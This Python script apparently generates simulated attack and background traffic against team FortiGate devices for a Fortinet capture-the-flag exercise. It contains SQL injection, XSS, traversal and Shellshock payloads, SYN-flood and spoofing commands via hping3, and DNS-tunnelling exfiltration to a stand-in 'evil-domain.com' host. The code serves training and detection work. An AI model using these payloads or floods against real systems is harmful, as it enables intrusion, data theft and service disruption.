#!/usr/bin/env python3
"""
CTF Traffic Generator — Generates traffic patterns for Fortinet CTF Phases 1 & 2.

FASE 1 (FortiGate): Generates obvious attacks for policy configuration
FASE 2 (FortiAnalyzer): Generates realistic attack campaigns for log analysis

Traffic Types:
- Legitimate traffic (HTTP, DNS, HTTPS, business apps)
- Obvious attacks (port scans, brute force, clear exploits) — FASE 1
- Stealth attacks (APT, DNS tunneling, behavioral anomalies) — FASE 2
- Multi-stage campaigns (recon → exploit → persistence → exfiltration) — FASE 2

Usage:
    python generator.py                           # Run all traffic patterns
    python generator.py --mode basic             # Only obvious attacks (Fase 1)
    python generator.py --mode advanced          # Stealth attacks (Fase 2)
    python generator.py --mode both              # All attack types
    python generator.py --challenge open_sesame  # Run specific challenge traffic
    python generator.py --team 1                 # Target specific team
    python generator.py --once                   # Run once (no loop)
"""

import json
import os
import sys
import time
import subprocess
import argparse
import logging
import random
import socket
import hashlib
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(message)s')
logger = logging.getLogger('trafficgen')

# Load team configs
TEAM_CONFIGS = {}
config_path = '/opt/ctf/team_configs.json'
if os.path.exists(config_path):
    with open(config_path) as f:
        TEAM_CONFIGS = json.load(f)


# ─── Traffic Patterns ────────────────────────────────────────────────────

class TrafficGenerator:
    """Generates various traffic patterns for CTF challenges."""

    def __init__(self, team_configs, mode='both'):
        """
        Initialize traffic generator.
        
        Args:
            team_configs: Dict of team configurations
            mode: 'basic' (Fase 1), 'advanced' (Fase 2), 'both' (default)
        """
        self.team_configs = team_configs
        self.mode = mode
        self.session_id = random.randint(1000, 9999)  # For campaign correlation

    def run_all(self, interval=30):
        """Run all traffic patterns in a loop."""
        logger.info(f"Starting traffic generator for {len(self.team_configs)} teams")
        logger.info(f"Interval: {interval}s between rounds")

        while True:
            try:
                with ThreadPoolExecutor(max_workers=10) as executor:
                    for team_id, config in self.team_configs.items():
                        executor.submit(self.generate_for_team, team_id, config)
                logger.info(f"Round complete. Sleeping {interval}s...")
                time.sleep(interval)
            except KeyboardInterrupt:
                logger.info("Shutting down traffic generator")
                break
            except Exception as e:
                logger.error(f"Error in traffic round: {e}")
                time.sleep(10)

    def generate_for_team(self, team_id, config):
        """Generate all traffic patterns for a specific team."""
        fgt_wan_ip = config.get('fgt_wan_ip', '')
        if not fgt_wan_ip:
            return

        logger.debug(f"Generating {self.mode} traffic for team {team_id} (FGT: {fgt_wan_ip})")

        # Always generate legitimate traffic (background noise)
        self.send_legitimate_traffic(fgt_wan_ip, config)

        # FASE 1 - Obvious attacks for FortiGate policy configuration
        if self.mode in ['basic', 'both']:
            self.send_obvious_attacks(fgt_wan_ip, config, team_id)

        # FASE 2 - Stealth attacks for FortiAnalyzer log analysis  
        if self.mode in ['advanced', 'both']:
            self.send_stealth_attacks(fgt_wan_ip, config, team_id)

    # ═══════════════════════════════════════════════════════════════════
    # FASE 1 — OBVIOUS ATTACKS (FortiGate Policy Configuration)
    # ═══════════════════════════════════════════════════════════════════

    def send_obvious_attacks(self, fgt_ip, config, team_id):
        """Send obvious, easy-to-detect attacks for FortiGate policy challenges."""
        logger.debug(f"Sending obvious attacks to team {team_id}")
        
        # Massive port scan (very obvious)
        self.massive_port_scan(fgt_ip, config)
        
        # Brute force SSH attacks (clear login attempts)
        self.brute_force_ssh(fgt_ip, config)
        
        # Web exploits (obvious SQLi, XSS payloads)
        self.obvious_web_exploits(fgt_ip, config)
        
        # Malware downloads (EICAR + obvious samples)
        self.malware_downloads(fgt_ip, config)
        
        # DDoS simulation (connection flooding)
        self.ddos_simulation(fgt_ip, config)

    def massive_port_scan(self, fgt_ip, config):
        """Obvious port scan - easy to detect and block."""
        common_ports = ['22', '23', '25', '53', '80', '110', '143', '443', '993', '995']
        try:
            # Use nmap for obvious scanning
            subprocess.run([
                'nmap', '-sS', '-F', '--max-retries=1', '--host-timeout=5s',
                '-p', ','.join(common_ports), fgt_ip
            ], capture_output=True, timeout=30)
            logger.debug(f"Port scan executed against {fgt_ip}")
        except Exception as e:
            logger.debug(f"Port scan failed: {e}")

    def brute_force_ssh(self, fgt_ip, config):
        """Obvious SSH brute force attempts."""
        usernames = ['admin', 'root', 'user', 'test', 'fortinet']
        passwords = ['admin', 'password', '123456', 'fortinet', 'admin123']
        
        for username in usernames[:3]:  # Limit attempts
            for password in passwords[:3]:
                try:
                    # Simulate SSH connection attempt
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((fgt_ip, 22))
                    sock.close()
                    if result == 0:
                        logger.debug(f"SSH brute force attempt: {username}:{password}")
                    time.sleep(0.5)  # Small delay between attempts
                except Exception:
                    pass

    def obvious_web_exploits(self, fgt_ip, config):
        """Clear web exploitation attempts."""
        exploits = [
            # SQL injection (obvious)
            f"http://{fgt_ip}/login?user=admin'%20OR%201=1--&pass=any",
            f"http://{fgt_ip}/search?q='; DROP TABLE users; --",
            # XSS (obvious)
            f"http://{fgt_ip}/search?q=<script>alert('XSS')</script>",
            f"http://{fgt_ip}/comment?text=<img src=x onerror=alert('XSS')>",
            # Directory traversal (obvious)
            f"http://{fgt_ip}/files?path=../../../../etc/passwd",
            f"http://{fgt_ip}/download?file=../../../windows/system32/config/sam",
        ]
        
        for exploit_url in exploits:
            try:
                subprocess.run(['curl', '-s', '--connect-timeout', '3', exploit_url],
                             capture_output=True, timeout=5)
            except Exception:
                pass

    def malware_downloads(self, fgt_ip, config):
        """Obvious malware download attempts."""
        # EICAR test (standard AV test)
        eicar = r'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
        
        # Fake malware URLs (will trigger URL filtering)
        malware_urls = [
            'http://malware-test.com/eicar.com',
            'http://malicious-site.net/trojan.exe',
            'http://bad-domain.org/ransomware.zip'
        ]
        
        try:
            # Send EICAR via HTTP POST
            subprocess.run(['curl', '-s', '--connect-timeout', '3', 
                          '-d', eicar, f'http://{fgt_ip}/upload'],
                         capture_output=True, timeout=5)
            
            # Request malware URLs
            for url in malware_urls:
                subprocess.run(['curl', '-s', '--connect-timeout', '3', url],
                             capture_output=True, timeout=5)
        except Exception:
            pass

    def ddos_simulation(self, fgt_ip, config):
        """Simulate DDoS attacks (connection flooding)."""
        try:
            # Use hping3 for SYN flood simulation
            subprocess.run([
                'hping3', '-S', '-p', '80', '--flood', '--rand-source',
                '-c', '100', fgt_ip
            ], capture_output=True, timeout=10)
        except Exception:
            # Fallback: multiple quick connections
            for i in range(20):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect_ex((fgt_ip, 80))
                    sock.close()
                except Exception:
                    pass

    # ═══════════════════════════════════════════════════════════════════
    # FASE 2 — STEALTH ATTACKS (FortiAnalyzer Log Analysis)
    # ═══════════════════════════════════════════════════════════════════

    def send_stealth_attacks(self, fgt_ip, config, team_id):
        """Send realistic, subtle attacks for FortiAnalyzer analysis challenges."""
        logger.debug(f"Sending stealth attacks to team {team_id}")
        
        # Multi-stage attack campaign
        self.apt_campaign(fgt_ip, config, team_id)
        
        # DNS tunneling for data exfiltration
        self.dns_tunneling(fgt_ip, config)
        
        # Behavioral anomalies (user compromise simulation)
        self.behavioral_anomalies(fgt_ip, config, team_id)
        
        # Lateral movement simulation
        self.lateral_movement(fgt_ip, config)
        
        # Data exfiltration attempts
        self.data_exfiltration(fgt_ip, config)

    def apt_campaign(self, fgt_ip, config, team_id):
        """
        Simulate Advanced Persistent Threat multi-stage campaign.
        Timeline: Recon → Initial Access → Persistence → Lateral Movement → Exfiltration
        """
        campaign_id = f"{self.session_id}-{team_id}-APT"
        
        # Stage 1: Reconnaissance (subtle)
        self.subtle_reconnaissance(fgt_ip, campaign_id)
        time.sleep(random.randint(300, 900))  # 5-15 min delay
        
        # Stage 2: Initial access (social engineering simulation)
        self.initial_access(fgt_ip, campaign_id)
        time.sleep(random.randint(600, 1800))  # 10-30 min delay
        
        # Stage 3: Persistence establishment
        self.establish_persistence(fgt_ip, campaign_id)
        time.sleep(random.randint(900, 2700))  # 15-45 min delay
        
        # Stage 4: Data collection & exfiltration
        self.data_collection(fgt_ip, campaign_id)

    def subtle_reconnaissance(self, fgt_ip, campaign_id):
        """Subtle reconnaissance - looks like normal traffic."""
        # Slow, spread-out port scan
        ports = ['22', '80', '443', '25', '53']
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect_ex((fgt_ip, int(port)))
                sock.close()
                time.sleep(random.randint(30, 120))  # Slow scan
            except Exception:
                pass

    def initial_access(self, fgt_ip, campaign_id):
        """Simulate initial access via social engineering."""
        # Simulate "user" clicking malicious link
        phishing_urls = [
            f"http://{fgt_ip}/documents/Q4-Report.pdf.exe",
            f"http://{fgt_ip}/hr/benefits-update.scr",
            f"http://{fgt_ip}/it/security-patch.msi"
        ]
        
        for url in phishing_urls:
            try:
                subprocess.run(['curl', '-s', '--connect-timeout', '3', url],
                             capture_output=True, timeout=5)
                time.sleep(random.randint(10, 60))
            except Exception:
                pass

    def establish_persistence(self, fgt_ip, campaign_id):
        """Simulate persistence establishment."""
        # Simulate registry modifications, scheduled tasks, etc.
        persistence_indicators = [
            'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate',
            'C:\\Windows\\System32\\svchost32.exe',
            'C:\\Users\\Public\\Documents\\system.dll'
        ]
        
        # These would be in logs as process creation/file writes
        logger.info(f"APT persistence established: {campaign_id}")

    def data_collection(self, fgt_ip, campaign_id):
        """Simulate data collection and staging."""
        # Simulate file system enumeration
        sensitive_files = [
            'financials.xlsx', 'customer_data.csv', 'passwords.txt',
            'company_secrets.docx', 'employee_info.db'
        ]
        
        for filename in sensitive_files:
            try:
                # Simulate file access
                subprocess.run(['curl', '-s', '--connect-timeout', '2',
                              f'http://{fgt_ip}/files/{filename}'],
                             capture_output=True, timeout=5)
            except Exception:
                pass

    def dns_tunneling(self, fgt_ip, config):
        """Simulate DNS tunneling for covert data exfiltration."""
        # Encoded data in DNS queries
        exfil_data = "sensitive_financial_data_q3_results"
        encoded_data = exfil_data.encode().hex()
        
        # Split into chunks for DNS queries
        chunks = [encoded_data[i:i+30] for i in range(0, len(encoded_data), 30)]
        
        for i, chunk in enumerate(chunks):
            try:
                # DNS query with data in subdomain
                domain = f"{chunk}.{i}.exfil.evil-domain.com"
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)
                
                # Simple DNS query format (simplified)
                query_id = b'\x12\x34'
                flags = b'\x01\x00'
                questions = b'\x00\x01'
                answers = b'\x00\x00\x00\x00\x00\x00'
                query_name = domain.encode()
                query_type = b'\x00\x01\x00\x01'  # A record
                
                # Send DNS query to public DNS
                try:
                    sock.sendto(query_id + flags + questions + answers + query_name + query_type, 
                              ('8.8.8.8', 53))
                except:
                    pass
                finally:
                    sock.close()
                
                time.sleep(random.randint(60, 300))  # Slow exfiltration
            except Exception:
                pass

    def behavioral_anomalies(self, fgt_ip, config, team_id):
        """Simulate compromised user behavioral patterns."""
        # Unusual login times, locations, access patterns
        anomaly_patterns = [
            # Off-hours access
            lambda: logger.info(f"User login at 3:47 AM - team {team_id}"),
            # Unusual file access patterns
            lambda: self.unusual_file_access(fgt_ip),
            # Privilege escalation attempts
            lambda: self.privilege_escalation(fgt_ip)
        ]
        
        for pattern in random.sample(anomaly_patterns, 2):
            pattern()
            time.sleep(random.randint(30, 300))

    def unusual_file_access(self, fgt_ip):
        """Simulate unusual file access patterns."""
        sensitive_paths = [
            '/admin/config.xml',
            '/database/backup.sql',
            '/hr/salaries.xlsx',
            '/finance/budget.pdf'
        ]
        
        for path in sensitive_paths:
            try:
                subprocess.run(['curl', '-s', '--connect-timeout', '2',
                              f'http://{fgt_ip}{path}'],
                             capture_output=True, timeout=5)
            except Exception:
                pass

    def privilege_escalation(self, fgt_ip):
        """Simulate privilege escalation attempts."""
        escalation_attempts = [
            'sudo su -',
            'net user administrator',
            'whoami /priv',
            'cat /etc/shadow'
        ]
        # These would appear in process logs
        logger.debug(f"Privilege escalation indicators generated for {fgt_ip}")

    def lateral_movement(self, fgt_ip, config):
        """Simulate lateral movement across network."""
        # Simulate SMB, RDP, WMI connections to other hosts
        target_ips = ['10.0.1.10', '10.0.1.20', '10.0.1.30']  # Internal IPs
        
        for target in target_ips:
            try:
                # SMB connection attempt
                subprocess.run(['nc', '-zv', target, '445'], 
                             capture_output=True, timeout=5)
                # RDP connection attempt  
                subprocess.run(['nc', '-zv', target, '3389'],
                             capture_output=True, timeout=5)
                time.sleep(random.randint(60, 300))
            except Exception:
                pass

    def data_exfiltration(self, fgt_ip, config):
        """Simulate large data transfers (exfiltration)."""
        # Large file uploads to external sites
        fake_data = "A" * (1024 * 100)  # 100KB of fake data
        
        exfil_sites = [
            'http://file-sharing.com/upload',
            'http://temp-storage.net/put',
            'http://data-dump.org/store'
        ]
        
        for site in exfil_sites:
            try:
                subprocess.run(['curl', '-s', '--connect-timeout', '5',
                              '-d', fake_data, site],
                             capture_output=True, timeout=10)
                time.sleep(random.randint(300, 900))  # Spread out transfers
            except Exception:
                pass

    # ── Legitimate Traffic ────────────────────────────────────────────

    def send_legitimate_traffic(self, fgt_ip, config):
        """Send normal-looking traffic through the FortiGate."""
        targets = [
            ('8.8.8.8', 53, 'udp'),      # DNS
            ('1.1.1.1', 53, 'udp'),       # DNS
            ('93.184.216.34', 80, 'tcp'),  # example.com HTTP
            ('93.184.216.34', 443, 'tcp'), # example.com HTTPS
        ]

        for target_ip, port, proto in targets:
            try:
                if proto == 'tcp':
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect_ex((target_ip, port))
                    sock.close()
                elif proto == 'udp':
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(2)
                    # DNS query for google.com
                    dns_query = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                    dns_query += b'\x06google\x03com\x00\x00\x01\x00\x01'
                    sock.sendto(dns_query, (target_ip, port))
                    sock.close()
            except Exception:
                pass

    # ── Malicious IP Traffic (Challenge: who_goes_there) ──────────────

    def send_malicious_ips(self, fgt_ip, config):
        """
        Send traffic FROM known malicious IPs.
        Teams need to create address objects and block these.
        """
        malicious_ips = ['198.51.100.10', '198.51.100.20', '198.51.100.30']

        for mal_ip in malicious_ips:
            try:
                # Use hping3 to spoof source IP
                subprocess.run(
                    ['hping3', '-S', '-p', '80', '-c', '3', '--fast',
                     '-a', mal_ip, fgt_ip],
                    capture_output=True, timeout=5
                )
            except FileNotFoundError:
                # Fallback: just try connecting (won't spoof but generates logs)
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect_ex((fgt_ip, 80))
                    sock.close()
                except Exception:
                    pass
            except Exception as e:
                logger.debug(f"Malicious traffic send failed: {e}")

    # ── EICAR Test (Challenge: inspector_gadget) ──────────────────────

    def send_eicar_test(self, fgt_ip, config):
        """
        Send EICAR test file through the FortiGate.
        This triggers AV detection if profiles are configured.
        """
        # EICAR test string (standard AV test file)
        eicar = (
            r'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
        )

        try:
            # Try to send via HTTP through the FortiGate
            subprocess.run(
                ['curl', '-s', '--connect-timeout', '3',
                 '-d', eicar,
                 f'http://{fgt_ip}:80/test-av'],
                capture_output=True, timeout=5
            )
        except Exception as e:
            logger.debug(f"EICAR send failed: {e}")

    # ── Exploit Attempts (Challenge: inspector_gadget IPS) ────────────

    def send_exploit_attempts(self, fgt_ip, config):
        """
        Send packets that trigger IPS signatures.
        Using common patterns that FortiGate IPS detects.
        """
        exploit_payloads = [
            # SQL injection attempts
            b"GET /login?user=admin'%20OR%201=1-- HTTP/1.1\r\nHost: target\r\n\r\n",
            # XSS attempts
            b"GET /search?q=<script>alert('xss')</script> HTTP/1.1\r\nHost: target\r\n\r\n",
            # Directory traversal
            b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n",
            # Shell shock
            b"GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'\r\n\r\n",
        ]

        for payload in exploit_payloads:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((fgt_ip, 80))
                sock.send(payload)
                sock.recv(1024)
                sock.close()
            except Exception:
                pass

    # ── Challenge-Specific Generators ─────────────────────────────────

    def run_challenge(self, challenge_id, team_id=None):
        """Run traffic for a specific challenge."""
        targets = self.team_configs
        if team_id:
            targets = {team_id: self.team_configs[team_id]}

        # FASE 1 Challenges (FortiGate)
        basic_generators = {
            'open_sesame': lambda ip, cfg, tid: self.send_legitimate_traffic(ip, cfg),
            'who_goes_there': lambda ip, cfg, tid: (
                self.send_malicious_ips(ip, cfg),
                self.malware_downloads(ip, cfg)
            ),
            'inspector_gadget': lambda ip, cfg, tid: (
                self.send_eicar_test(ip, cfg),
                self.send_exploit_attempts(ip, cfg),
                self.obvious_web_exploits(ip, cfg)
            ),
            'the_insider': lambda ip, cfg, tid: (
                self.send_legitimate_traffic(ip, cfg),
                self.brute_force_ssh(ip, cfg)
            ),
            'zero_trust': lambda ip, cfg, tid: (
                self.send_legitimate_traffic(ip, cfg),
                self.massive_port_scan(ip, cfg),
                self.ddos_simulation(ip, cfg)
            ),
            'mission_impossible': lambda ip, cfg, tid: (
                self.send_legitimate_traffic(ip, cfg),
                self.send_malicious_ips(ip, cfg),
                self.send_eicar_test(ip, cfg)
            ),
            'social_butterfly': lambda ip, cfg, tid: (
                self.send_legitimate_traffic(ip, cfg),
                self.obvious_web_exploits(ip, cfg)
            )
        }

        # FASE 2 Challenges (FortiAnalyzer) 
        advanced_generators = {
            'primera_vista': lambda ip, cfg, tid: self.send_legitimate_traffic(ip, cfg),
            'filtro_maestro': lambda ip, cfg, tid: self.massive_port_scan(ip, cfg),
            'reporte_express': lambda ip, cfg, tid: self.send_legitimate_traffic(ip, cfg),
            'detective_novato': lambda ip, cfg, tid: self.massive_port_scan(ip, cfg),
            'correlador_eventos': lambda ip, cfg, tid: self.apt_campaign(ip, cfg, tid),
            'timeline_master': lambda ip, cfg, tid: self.apt_campaign(ip, cfg, tid),
            'cazador_patrones': lambda ip, cfg, tid: self.dns_tunneling(ip, cfg),
            'analista_comportamiento': lambda ip, cfg, tid: self.behavioral_anomalies(ip, cfg, tid),
            'comandante_incidentes': lambda ip, cfg, tid: (
                self.apt_campaign(ip, cfg, tid),
                self.lateral_movement(ip, cfg),
                self.data_exfiltration(ip, cfg)
            ),
            'cazador_apt': lambda ip, cfg, tid: self.apt_campaign(ip, cfg, tid)
        }

        # Select generator based on mode
        if self.mode == 'basic':
            generators = basic_generators
        elif self.mode == 'advanced':
            generators = advanced_generators
        else:  # both
            generators = {**basic_generators, **advanced_generators}

        gen = generators.get(challenge_id)
        if not gen:
            logger.error(f"No traffic generator for challenge '{challenge_id}' in mode '{self.mode}'")
            return

        for tid, config in targets.items():
            fgt_ip = config.get('fgt_wan_ip', '')
            if fgt_ip:
                gen(fgt_ip, config, tid)
                logger.info(f"Generated {challenge_id} traffic for team {tid} ({self.mode} mode)")


# ─── Main ────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description='CTF Traffic Generator for Fortinet CTF Phases 1 & 2')
    parser.add_argument('--mode', choices=['basic', 'advanced', 'both'], default='both',
                       help='Traffic mode: basic (Fase 1), advanced (Fase 2), both (default)')
    parser.add_argument('--challenge', help='Run specific challenge traffic')
    parser.add_argument('--team', help='Target specific team')
    parser.add_argument('--once', action='store_true', help='Run once (no loop)')
    parser.add_argument('--interval', type=int, default=30, help='Seconds between rounds')
    args = parser.parse_args()

    if not TEAM_CONFIGS:
        logger.error("No team configs found. Exiting.")
        sys.exit(1)

    logger.info(f"Starting traffic generator in '{args.mode}' mode")
    gen = TrafficGenerator(TEAM_CONFIGS, mode=args.mode)

    if args.challenge:
        gen.run_challenge(args.challenge, args.team)
        if not args.once:
            while True:
                time.sleep(args.interval)
                gen.run_challenge(args.challenge, args.team)
    elif args.once:
        for team_id, config in TEAM_CONFIGS.items():
            gen.generate_for_team(team_id, config)
    else:
        gen.run_all(interval=args.interval)


if __name__ == '__main__':
    main()
